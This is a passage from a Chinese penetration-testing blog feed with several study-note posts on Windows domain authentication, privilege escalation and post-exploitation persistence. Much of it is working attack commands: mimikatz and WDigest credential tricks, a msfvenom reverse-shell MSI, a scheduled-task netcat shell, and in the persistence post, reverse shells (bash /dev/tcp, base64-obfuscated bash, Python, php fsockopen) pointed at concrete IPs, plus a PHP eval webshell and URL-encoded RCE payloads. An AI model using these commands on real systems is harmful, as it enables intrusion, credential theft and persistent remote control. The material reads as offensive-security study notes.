        <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="工作组与域"><a href="#工作组与域" class="headerlink" title="工作组与域"></a>工作组与域</h2><p><a href="https://apt404.github.io/2016/08/10/workgroup-domain-dc/">工作组,域,域控是什么及它们之间的一些关系 | APT404-不作恶</a></p><blockquote><p>  工作组就是把一些具有相同职能(比如,可以按部门,按房间号,按岗位,按操作系统类型等的不同进行分组管理)的机器都放到一个组里。</p><p>  实际上工作组只是形式上的把大家放在了一起而已,并不存在真正的集中管理作用,工作组内的每台机器依然是相互独立,互不干涉,各自为政的。如果要访问工作组中其他主机的资源，需要提供该主机的账号密码。</p><p>  域，通过域管理员管理域控（DC）来对域内主机进行管理，要想访问域内主机资源，就要成为域内用户，并受限于身份。</p><p>  域管理员可以任意操作域内的任意一台主机（当主机加入域中时，域控就会向该主机的本地管理组中加入域管理员账户）</p><p>  域控服务器上的用户默认为域用户</p><p>  AD（ Active Directory ）：保存域用户身份凭证</p></blockquote><h2 id="Windows身份认证机制"><a href="#Windows身份认证机制" class="headerlink" title="Windows身份认证机制"></a>Windows身份认证机制</h2><p><a href="https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/">域渗透学习（一）Windows认证机制 | AresX’s Blog</a></p><h3 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h3><blockquote><p>指用户直接操作计算机登陆账户</p></blockquote><p>![image-20230331000339946](E:\typora img\image-20230331000339946.png)</p><p>本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对。我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</p><h3 id="网络认证netNTLM"><a href="#网络认证netNTLM" class="headerlink" title="网络认证netNTLM"></a>网络认证netNTLM</h3><p>挑战响应机制</p><p>![image-20230601124340615](E:\typora img\image-20230601124340615.png)</p><h3 id="域认证–Kerberos协议"><a href="#域认证–Kerberos协议" class="headerlink" title="域认证–Kerberos协议"></a>域认证–Kerberos协议</h3><p><a href="https://ares-x.com/2020/03/17/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89Kerberos%E5%8D%8F%E8%AE%AE/">域渗透学习（二）Kerberos协议 | AresX’s Blog</a></p><p>![image-20230330213515103](E:\typora img\image-20230330213515103.png)</p><p>参与认证的三个角色的NTLM Hash是三个密钥，这三个NTLM Hash的唯一作用是确保会话密钥Sessionkey的安全传输</p><h4 id="验证身份"><a href="#验证身份" class="headerlink" title="验证身份"></a>验证身份</h4><p>收到两个消息，都是先用自己的NTLM哈希进行解密，得到会话密钥和cilent id，时间戳，再用会话密钥对另一个消息进行解密，得到另一组cilent id和时间戳，将解密得到的这两组cilent id和时间戳进行比较，如果相同，则验证成功。</p><h4 id="黄金票据TGT-Ticket-Granting-Ticket"><a href="#黄金票据TGT-Ticket-Granting-Ticket" class="headerlink" title="黄金票据TGT(Ticket Granting Ticket)"></a>黄金票据TGT(Ticket Granting Ticket)</h4><blockquote><p>用于身份认证，存储在内存，默认有效期为10小时</p></blockquote><p>内容为<strong>Client&#x2F;TGS Sessionkey</strong>和<strong>cilent id，时间戳</strong>，由KDC中的AS用<strong>KDC密钥（即TGS密钥&#x2F;KDC服务器krbtgt用户的NTLM Hash）</strong>加密得到</p><p>（向KDC请求身份认证，所以用KDC密钥加密）</p><h4 id="白银票据TGS-Ticket-Granting-Server"><a href="#白银票据TGS-Ticket-Granting-Server" class="headerlink" title="白银票据TGS(Ticket Granting Server)"></a>白银票据TGS(Ticket Granting Server)</h4><p>内容为<strong>Client&#x2F;Server Sessionkey</strong>和<strong>cilent id，时间戳</strong>,由KDC中的TGS用**Server密钥(服务器的NTLMHASH)**加密得到</p><p>（向Server请求服务，所以用Server密钥加密）</p><p>二者区别</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黄金票据，获取KDC用户（krbtg用户的hash值）就可以伪造任意用户的黄金票据从而实现对域内任意机器的一个访问。</span><br><span class="line"></span><br><span class="line">白银票据，当获取到域内机器用户的hash值就可以伪造一个真正的白银票据。实现对某个机器特定服务的访问。</span><br><span class="line"></span><br><span class="line">他们两个区别就在黄金票据作用更大获得TGT票据后可以访问任意机器任意服务，白银只能指定机器指定服务。</span><br></pre></td></tr></table></figure><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p><strong>原理</strong></p><p>本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对</p><p>我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</p><p><strong>使用注意事项</strong></p><p>需要高权限，可以先用privailge模块提权</p><p><strong>补丁</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安装了KB2871997补丁或者系统版本大于windows server 2012时，lsass.exe不保存明文密码不保存明文的密码。</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启用Wdigest Auth，内存中还是会保存系统的明文口令</span><br><span class="line">将下列注册表路径的</span><br><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest</span><br><span class="line">以下项的</span><br><span class="line">UseLogonCredential</span><br><span class="line">值修改成0或1</span><br><span class="line">0：关闭Wdigest Auth</span><br><span class="line">1：启动Wdigest Auth</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>后渗透之权限提升</title>
      <link href="/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<h2 id="提权的本质"><a href="#提权的本质" class="headerlink" title="提权的本质"></a>提权的本质</h2><p><strong>利用权限配置的失误</strong></p><h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><blockquote><p>需要服务器开启数据库服务及获取到最高权限用户密码。</p><p>除 Access 数据库外，其他数据库基本都存在数据库提权的可能。</p></blockquote><p><a href="https://www.sqlsec.com/2020/11/mysql.html">MYSQL 国光师傅总结</a></p><p>UDF提权只能获得mysql的运行权限，对于linux系统，默认给mysql分配一个”mysql:mysql”用户，所以对于linux系统来说这个给提权没啥意义。</p><p><img src="/../images/14483f65ba5d4390940eaf054d71b0f9-1693976641900.png" alt="fs"></p><h2 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><a href="https://blog.csdn.net/fuhanghang/article/details/128786603">Windows的权限（用户、组和访问控制）_</a></p><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>从 Webshell、数据库权—&gt; 系统普通用户权限—&gt;Administrator 权限—&gt;System 权限</p><h3 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h3><p><img src="/../images/1605453393_5fb146513192ec6c15dae.png!small" alt="1605453393_5fb146513192ec6c15dae.png!small"></p><h4 id="系统配置错误"><a href="#系统配置错误" class="headerlink" title="系统配置错误"></a>系统配置错误</h4><p>工具</p><p><a href="https://github.com/mertdas/PrivKit">mertdas&#x2F;PrivKit: PrivKit is a simple beacon object file that detects privilege escalation vulnerabilities caused by misconfigurations on Windows OS. (github.com)</a></p><p>检查清单</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Checks for Unquoted Service Paths</span><br><span class="line">Checks for Autologon Registry Keys</span><br><span class="line">Checks for Always Install Elevated Registry Keys</span><br><span class="line">Checks for Modifiable Autoruns</span><br><span class="line">Checks for Hijackable Paths</span><br><span class="line">Enumerates Credentials From Credential Manager</span><br><span class="line">Looks for current Token Privileges</span><br></pre></td></tr></table></figure><p>该工具为CS的插件，导入后在beacon中使用</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">beacon&gt; privcheck</span><br></pre></td></tr></table></figure><h5 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h5><p><img src="/../images/20201014150247256.png" alt="img"></p><p><strong>路径没有包含在引号中，服务会按照以下顺序依次执行</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\program.exe</span><br><span class="line">c:\program files.exe</span><br><span class="line">c:\program files (x86)\grasssoft\macro.exe</span><br><span class="line">c:\program files (x86)\grasssoft\macro expert\MacroService.exe</span><br></pre></td></tr></table></figure><p>可以看到 Windows 尝试执行了四次才找到真正的程序。</p><p>由于 Windows 服务通常是以 SYSTEM 权限运行的，所以在系统找到空格前的程序并执行时，也将以 SYSTEM 权限运行这个程序。</p><p>即我们把木马程序命名为 Program.exe ，然后放到 C 盘下，当上面的服务重启时，系统就会执行我们的木马程序。</p><p>可以使用以下命令查看系统中错误配置的路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自动安装配置文件</span></span><br><span class="line">C:\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># IIS配置文件</span></span><br><span class="line">C:\inetpub\wwwroot\web.config</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\Config\web.config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索凭证</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PuTTY是Windows系统上常见的SSH客户端。用户不必每次都指定连接的参数，而是可以将会话存储在IP、用户和其他配置可以存储的地方，以供以后使用。虽然PuTTY不允许用户存储他们的SSH密码，但它会存储包括明文身份验证凭据的代理配置。</span><br><span class="line"></span><br><span class="line">要检索存储的代理凭证，您可以使用以下命令在以下注册表项下搜索ProxyPassword:</span><br><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br><span class="line"></span><br><span class="line">注意:Simon Tatham是PuTTY的创建者(他的名字是路径的一部分)，而不是我们正在检索密码的用户名。运行上述命令后，存储的代理用户名也应该是可见的。</span><br><span class="line"></span><br><span class="line">就像putty存储凭据一样，任何存储密码的软件，包括浏览器、电子邮件客户端、FTP客户端、SSH客户端、VNC软件等，都有恢复用户保存的任何密码的方法。</span><br></pre></td></tr></table></figure><h5 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询定时任务</span></span><br><span class="line">schtasks /query</span><br><span class="line"><span class="comment"># 查看权限</span></span><br><span class="line">icacls</span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line"><span class="built_in">echo</span> c:\tools\nc64.exe <span class="literal">-e</span> cmd.exe  <span class="number">10.17</span>.<span class="number">16.148</span>  <span class="number">1234</span> &gt; C:\tasks\schtask.bat</span><br></pre></td></tr></table></figure><h5 id="恶意msi安装程序"><a href="#恶意msi安装程序" class="headerlink" title="恶意msi安装程序"></a>恶意msi安装程序</h5><p>前置条件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure><p>msf生成恶意msi</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.63.3 LPORT=LOCAL_PORT -f msi -o malicious.msi</span><br></pre></td></tr></table></figure><p>受害机执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br></pre></td></tr></table></figure><p>或者使用exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevated模块</p><h4 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h4><ul><li><p>cmd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="Saved-Windows-Credentials"><a href="#Saved-Windows-Credentials" class="headerlink" title="Saved Windows Credentials"></a>Saved Windows Credentials</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230419221533716-1693976683312.png" alt="image-20230419221533716"></p><p>以这个用户权限开启一个新的cmd</p><h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><p>工具<a href="https://github.com/hfiref0x/UACME">hfiref0x&#x2F;UACME: Defeating Windows User Account Control (github.com)</a></p><h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>工具<a href="https://github.com/BeichenDream/SharpToken">BeichenDream&#x2F;SharpToken: Windows Token Stealing Expert (github.com)</a></p><blockquote><p>在红队横向移动期间，我们经常需要窃取其他用户的权限。在现代EDR的防御下，我们很难使用Mimikatz来获取其他用户权限，如果目标用户没有进程存活，我们也没有办法使用“OpenProcessToken”来窃取Token。</p><p>SharpToken是一个利用Token泄漏的工具。它可以从系统中的所有进程中找到泄漏的令牌并使用它们。如果您是低权限的服务用户，甚至可以使用它来升级到“NT AUTHORITY\SYSTEM”权限，并且可以切换到目标用户的桌面…</p></blockquote><h4 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h4><p>查找补丁情况来选择CVE打</p><h3 id="土豆系列"><a href="#土豆系列" class="headerlink" title="土豆系列"></a>土豆系列</h3><h4 id="烂土豆（Rotten-Potato）"><a href="#烂土豆（Rotten-Potato）" class="headerlink" title="烂土豆（Rotten Potato）"></a>烂土豆（Rotten Potato）</h4><p>烂土豆不适用于 &gt;&#x3D; Windows 10 1809 和 Windows Server 2019 的版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/foxglovesec/RottenPotato</span><br><span class="line"></span><br><span class="line">烂土豆配合MSF提权</span><br><span class="line">    使用令牌窃取进行提权</span><br><span class="line">    use incognito  （进入incognito模块）</span><br><span class="line">    通过MSF执行烂土豆</span><br><span class="line">    execute -cH -f RottenPotato.exe</span><br><span class="line">    list_tokens -u  （列出令牌）</span><br><span class="line">    impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure><h4 id="烂土豆NG（Rotten-PotatoNG）"><a href="#烂土豆NG（Rotten-PotatoNG）" class="headerlink" title="烂土豆NG（Rotten PotatoNG）"></a>烂土豆NG（Rotten PotatoNG）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/antonioCoco/JuicyPotatoNG</span><br><span class="line"></span><br><span class="line">JuicyPotatoNG.exe -t * -p &quot;c:\Windows\System32\cmd.exe&quot; -a &quot;/c whaomi &gt; .\1.txt&quot;</span><br><span class="line"></span><br><span class="line">强制参数:-t createprocess call: &lt;t&gt; CreateProcessWithTokenW， &lt;u&gt; CreateProcessAsUser， &lt;*&gt;同时尝试</span><br><span class="line">-p &lt;program&gt;:要启动的程序可选参数</span><br><span class="line">-1 &lt;port&gt;: COM服务器监听端口(默认为10247)</span><br><span class="line">-a &lt;argument&gt;:传递给程序的命令行参数(默认为NULL)</span><br><span class="line">-c &lt;CLSID&gt;:(默认值&#123;854A20FB-2D44-457D-992F-EF13785D2B51&#125;)</span><br><span class="line">-i:交互式控制台(仅对CreateProcessAsUser有效)额外的模式</span><br><span class="line">-b:暴力破解所有clsid。alert:仅用于测试。大约会产生1000个进程!</span><br><span class="line">-s:寻找没有被Windows Defender防火墙过滤的合适COM端口</span><br></pre></td></tr></table></figure><h4 id="多汁土豆（Juicy-Potato）"><a href="#多汁土豆（Juicy-Potato）" class="headerlink" title="多汁土豆（Juicy Potato）"></a>多汁土豆（Juicy Potato）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/ohpe/juicy-potato</span><br><span class="line">http://ohpe.it/juicy-potato/CLSID/</span><br><span class="line">多汁土豆适用于&lt; Windows 10 1809 &lt; Windows Server 2019</span><br><span class="line">不需要 meterpreter shell，可以指定COM服务器侦听端口，可以选择CLSID</span><br><span class="line"></span><br><span class="line">查看当前用户权限，是否符合要求</span><br><span class="line">whoami /priv</span><br><span class="line">限制条件：需要支持SeImpersonate或者SeAssignPrimaryToken权限，开启DCOM，本地支持RPC或者远程服务器支持PRC并能成功登录，能够找到可用的COM对象</span><br><span class="line">    如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line">    如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br><span class="line">使用详情见https://github.com/ohpe/juicy-potato</span><br></pre></td></tr></table></figure><h4 id="多汁土豆NG（Juicy-PotatoNG）"><a href="#多汁土豆NG（Juicy-PotatoNG）" class="headerlink" title="多汁土豆NG（Juicy PotatoNG）"></a>多汁土豆NG（Juicy PotatoNG）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/antonioCoco/JuicyPotatoNG</span><br><span class="line">JuicyPotatoNG.exe -t * -p &quot;C:\windows\system32\cmd.exe&quot; -a &quot;/c whoami &gt; C:\JuicyPotatoNG.txt&quot;</span><br></pre></td></tr></table></figure><h4 id="RasmanPotato"><a href="#RasmanPotato" class="headerlink" title="RasmanPotato"></a>RasmanPotato</h4><p>Windows 10(11未测试)，Windows Server 2012 - 2019(2022未测试)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">magicRasMan v0.1</span><br><span class="line">Provided that the current user has the SeImpersonate privilege, this tool will have an escalation to SYSTEM</span><br><span class="line">Arguments:</span><br><span class="line"> -c &lt;CMD&gt;       Execute the command *CMD*</span><br><span class="line"> -m &lt;METHOD&gt;            Choose The RPC Function [1]VpnProtEngWinRtConnect [2]VpnProtEngGetInterface</span><br><span class="line"> -i             Interact with the new process in the current command prompt (default is non-interactive)</span><br></pre></td></tr></table></figure><h4 id="DCOMPotato"><a href="#DCOMPotato" class="headerlink" title="DCOMPotato"></a>DCOMPotato</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/zcgonvh/DCOMPotato</span><br></pre></td></tr></table></figure><h4 id="LocalPotato（CVE-2023-21746）"><a href="#LocalPotato（CVE-2023-21746）" class="headerlink" title="LocalPotato（CVE-2023-21746）"></a>LocalPotato（CVE-2023-21746）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/decoder-it/LocalPotato</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>后渗透之权限维持</title>
      <link href="/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="权限维持的目的"><a href="#权限维持的目的" class="headerlink" title="权限维持的目的"></a>权限维持的目的</h1><blockquote><p>当获取到服务器的控制权后，为了防止服务器管理员发现和修补漏洞导致对服务器权限的丢失，测试人员往往需要一些手段（后门）来实现对目标服务器的持久化访问。</p><p>持久化访问（Persistence，权限维持）技术就是包括任何可以被测试人员用来在系统重启、更改用户凭据或其他可能造成访问中断的情况发生时保持对系统的访问技术。</p></blockquote><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul><li><p>攻击机监听端口</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lnvp port</span><br></pre></td></tr></table></figure></li><li><p>被攻击机</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span></span><br><span class="line">bash -c <span class="string">&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjE5Mi4xMjAvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.174.129&#x27;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;])&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 124.220.192.120 1234 -e /bin/bash</span><br></pre></td></tr></table></figure><p><strong>注意点</strong>：用nc进行反弹shell，需要nc是提供-e参数的版本，但是系统apt默认安装的都是不提供反向链接的版本。</p><p><img src="/../../../blog/source/images/image-20230830215804216.png" alt="image-20230830215804216"></p><p>解决方法：</p><ul><li><p>上传编译好的nc</p></li><li><p>利用管道符</p><p>被攻击机</p><p><img src="/../../../blog/source/images/image-20230823145240080.png" alt="image-20230823145240080"></p><p>攻击机</p><p><img src="/../../../blog/source/images/image-20230823145311118.png" alt="image-20230823145311118"></p><p><img src="/../../../blog/source/images/image-20230823145323881.png" alt="image-20230823145323881"></p><p>利用1234端口将传入内容交给bash执行，再将内容从端口8888送出去</p></li></ul></li></ul><h2 id="获得交互式shell"><a href="#获得交互式shell" class="headerlink" title="获得交互式shell"></a>获得交互式shell</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c  &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>键入 Ctrl-Z，回到 VPS 的命令行中；第二步，在 VPS 中执行：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">stty raw -echo</span><br><span class="line">fg</span><br></pre></td></tr></table></figure><p>回到哑 shell 中；第三步，在哑 shell 中键入 Ctrl-l，执行：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reset</span><br><span class="line">export SHELL=bash</span><br><span class="line">export TERM=xterm-256color</span><br><span class="line">stty rows 54 columns 104</span><br></pre></td></tr></table></figure><h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><p>Webshell</p><p><a href="https://tttang.com/archive/1739/">java免杀合集 - 跳跳糖 (tttang.com)</a></p><p><a href="https://mp.weixin.qq.com/s/ZvQOJvJYAUMPWbLtLc5DZw">什么？你还不会webshell免杀？（一） (qq.com)</a></p><p><a href="https://tttang.com/archive/1840/">浅谈JspWebshell之编码 - 跳跳糖 (tttang.com)</a></p><p>木马</p><h1 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h1><p><a href="https://github.com/RuoJi6/HackerPermKeeper">https://github.com/RuoJi6/HackerPermKeeper</a>)</p><h1 id="Windows权限维持"><a href="#Windows权限维持" class="headerlink" title="Windows权限维持"></a>Windows权限维持</h1><p><a href="https://xz.aliyun.com/t/9718#toc-13">Windows权限维持总结 - 先知社区 (aliyun.com)</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>拓展：<a href="https://github.com/aplyc1a/blogs/tree/master/%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6/Linux">blogs&#x2F;持久控制&#x2F;Linux at master · aplyc1a&#x2F;blogs (github.com)</a></p><p><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/02.Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.html#%E6%B7%BB%E5%8A%A0%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7">02.Linux权限维持 · d4m1ts 知识库 (gm7.org)</a></p><h1 id="传参执行"><a href="#传参执行" class="headerlink" title="传参执行"></a>传参执行</h1><h2 id="重定向写入"><a href="#重定向写入" class="headerlink" title="重定向写入"></a>重定向写入</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;&gt;b.php</span><br></pre></td></tr></table></figure><blockquote><p>注意如果使用双引号$需要转义</p><p>然后在测试thinkphp rce的时候发现最后要加一个空格</p></blockquote><p>![image-20230403151335228](E:\typora img\image-20230403151335228.png)</p><p>上面的是加了空格的</p><p>下面的是没加空格的</p><h2 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;rce.php&#x27;</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;eval&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sysytem&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>=<span class="title function_ invoke__">system</span>(%<span class="number">22</span>bash%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.220.192.120%2F1234%20%3E%261&#x27;</span>%<span class="number">22</span>)%<span class="number">3</span>B  成功</span><br><span class="line"></span><br><span class="line">sysytem=python3%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;import socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22192.168.41.134%22%2C8888))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fbash%22%2C%22-i%22%5D)%3B&#x27;</span> 成功</span><br><span class="line">    </span><br><span class="line">system=bash%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F124.220.192.120%2F1234%200%3E%261&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;\$sock=fsockopen(\&quot;192.168.41.134\&quot;,8888);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>后渗透之了解</title>
      <link href="/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BA%86%E8%A7%A3/"/>
      <url>/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BA%86%E8%A7%A3/</url>
      
